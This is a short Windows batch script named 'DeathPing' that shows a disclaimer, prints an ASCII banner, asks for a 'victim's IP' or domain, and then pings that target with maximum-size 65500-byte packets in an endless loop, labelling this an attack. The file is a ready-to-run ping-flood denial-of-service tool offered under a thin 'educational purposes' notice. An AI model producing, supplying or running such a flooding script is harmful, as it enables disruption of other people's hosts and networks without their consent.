@echo off
color a
title DeathPing (Terms and conditions)
echo WARNING: This tool has been made for educational purposes and isn't specially designed to use for military missions or any type of government conflicts. 
echo We won't take responsibility for any type of harm made with this tool.
echo If you accept these conditions, press any key. Otherwise, exit this window.
pause
cls
title DeathPing (Requesting %username%'s target)
echo oooooooooo.                           .   oooo        ooooooooo.    o8o                         
echo `888'   `Y8b                        .o8   `888        `888   `Y88.  `"'
echo 888      888  .ooooo.   .oooo.   .o888oo  888 .oo.    888   .d88' oooo  ooo. .oo.    .oooooooo 
echo 888      888 d88' `88b `P  )88b    888    888P"Y88b   888ooo88P'  `888  `888P"Y88b  888' `88b  
echo 888      888 888ooo888  .oP"888    888    888   888   888          888   888   888  888   888  
echo 888     d88' 888    .o d8(  888    888 .  888   888   888          888   888   888  `88bod8P'  
echo o888bood8P'   `Y8bod8P' `Y888""8o   "888" o888o o888o o888o        o888o o888o o888o `8oooooo.  
echo                                                                                     d"     YD  
echo                                                                                     "Y88888P'  
set /p ip=Insert victim's IP (0.0.0.0) or domain (www.google.com): 
title DeathPing (%username% is running attack against %ip%)
echo The attack doesn't have ending. To stop the attack, press Ctrl + C.
timeout /t 5 
:a
ping %ip% -n 1 -l 65500
goto a